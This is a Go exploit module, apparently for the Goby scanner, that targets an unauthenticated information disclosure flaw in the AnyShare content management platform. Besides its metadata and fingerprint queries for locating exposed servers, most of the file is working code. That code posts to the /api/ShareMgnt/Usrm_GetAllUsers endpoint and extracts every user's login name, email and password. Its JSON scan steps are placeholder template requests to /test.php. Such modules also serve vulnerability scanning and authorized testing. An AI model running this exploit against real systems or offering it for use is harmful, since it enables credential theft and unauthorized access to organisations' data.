package exploits

import (
	"encoding/json"
	"fmt"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "AnyShare Intelligent Content Management Platform /api/ShareMgnt/Usrm_GetAllUsers Information Disclosure Vulnerability",
    "Description": "<p>The Usrm_GetAllUsers interface of AnyShare intelligent content management platform has an information leakage vulnerability. Unauthenticated attackers can obtain sensitive information such as usernames and passwords. They can log in to the backend, making the system extremely unsafe.</p>",
    "Product": "AISHU-AnyShare",
    "Homepage": "https://www.aishu.cn/cn/anyshare-family",
    "DisclosureDate": "2024-11-08",
    "PostTime": "2024-11-28",
    "Author": "1251220046@qq.com",
    "FofaQuery": "(body=\"res/libs/webuploader/webuploader.css\" && body=\"src=\\\"/res/libs/base64.min.js\\\"\") || (body=\"以下meta会导致ShareWeb手机访问预览过大，暂先屏蔽\" && body=\"ng-controller=\\\"MessageController\\\">\")",
    "GobyQuery": "(body=\"res/libs/webuploader/webuploader.css\" && body=\"src=\\\"/res/libs/base64.min.js\\\"\") || (body=\"以下meta会导致ShareWeb手机访问预览过大，暂先屏蔽\" && body=\"ng-controller=\\\"MessageController\\\">\")",
    "Level": "0",
    "Impact": "<p>The Usrm_GetAllUsers interface has an information leakage vulnerability. Unauthorized attackers may obtain sensitive information.</p>",
    "Recommendation": "<p>1. Deploy a Web application firewall. </p><p> 2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/143620118?spm=1001.2014.3001.5502"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "password",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.6",
    "Translation": {
        "CN": {
            "Name": "爱数AnyShare智能内容管理平台 /api/ShareMgnt/Usrm_GetAllUsers 信息泄露漏洞",
            "Product": "AISHU-AnyShare",
            "Description": "<p>爱数 AnyShare智能内容管理平台 Usrm_GetAllUsers 接口存在信息泄露漏洞，未经身份认证的攻击者可获取用户名密码等敏感信息。可登录后台，使系统处于极不安全状态。<br></p>",
            "Recommendation": "<p>1、部署Web应用防火墙。</p><p>&nbsp;2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>其 Usrm_GetAllUsers 接口存在信息泄露漏洞，未经授权的攻击者访问，可能会获得敏感信息<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "AnyShare Intelligent Content Management Platform /api/ShareMgnt/Usrm_GetAllUsers Information Disclosure Vulnerability",
            "Product": "AISHU-AnyShare",
            "Description": "<p>The Usrm_GetAllUsers interface of AnyShare intelligent content management platform has an information leakage vulnerability. Unauthenticated attackers can obtain sensitive information such as usernames and passwords. They can log in to the backend, making the system extremely unsafe.<br></p>",
            "Recommendation": "<p>1. Deploy a Web application firewall.&nbsp;</p><p>&nbsp;2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>The Usrm_GetAllUsers interface has an information leakage vulnerability. Unauthorized attackers may obtain sensitive information.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "EditType": "fast",
    "VariablesOrder": [],
    "PocId": "9974"
}`

	postOrGet_XeyP9U3OMx := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		setPostRequest := func(hostInfo *httpclient.FixUrl, urlGet string, payload string, head map[string]string) (*httpclient.HttpResponse, error) {
			postRequest := httpclient.NewPostRequestConfig(urlGet)
			postRequest.Timeout = 15
			postRequest.VerifyTls = false
			postRequest.FollowRedirect = false
			postRequest.Data = payload
			for headName, headValue := range head {
				postRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, postRequest)
		}

		header := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
			"Accept-Language": "gzip, deflate",
			"Connection":      "close",
		}

		rawData := "[1,100] "

		resp, err := setPostRequest(hostInfo, fileUrl, rawData, header)
		if err != nil || resp.StatusCode != 200 {
			return "", err
		}

		// 注意：返回值为（最终要返回的读取结果，错误）
		return resp.RawBody, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/api/ShareMgnt/Usrm_GetAllUsers"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/api/ShareMgnt/Usrm_GetAllUsers": "{\"directDeptInfo\":",
			}
			// 函数继承
			uploadFileFunc := postOrGet_XeyP9U3OMx

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"password": {"/api/ShareMgnt/Usrm_GetAllUsers", "{\"directDeptInfo\":"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_XeyP9U3OMx

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			// fmt.Println(resp)
			var data []map[string]interface{}

			err = json.Unmarshal([]byte(resp), &data)
			if err != nil {
				expResult.Success = false
				return expResult
			}

			var outputWithPassword, outputWithoutPassword string
			hasPasswdOutput := "Leaked information: Username and password information\n"
			noPasswdOutput := "No Password information was leaked!\n"

			var hasPassword = false

			for _, item := range data {
				user := item["user"].(map[string]interface{})

				// 从 user 对象中获取 loginName 和 email
				loginName, ok := user["loginName"].(string)
				if !ok {
					loginName = ""
				}
				email, ok := user["email"].(string)
				if !ok {
					email = ""
				}

				// 从 item 对象中获取 password
				password, ok := item["password"]
				if !ok || password == nil {
					// 如果没有密码信息，则将用户名和电子邮件添加到 outputWithoutPassword
					outputWithoutPassword += fmt.Sprintf("username:%s\nemail:%s\n\n", loginName, email)
					continue
				}
				hasPassword = true
				// 如果有密码信息，则将用户名、密码和电子邮件添加到 outputWithPassword
				outputWithPassword += fmt.Sprintf("username:%s\npassword:%s\nemail:%s\n\n", loginName, password, email)
			}

			// 构建最终的输出字符串
			var output string
			if !hasPassword {
				output = noPasswdOutput + outputWithoutPassword
			} else {
				output += hasPasswdOutput + outputWithPassword
			}

			expResult.Success = true
			expResult.Output = output

			return expResult
		},
	))
}
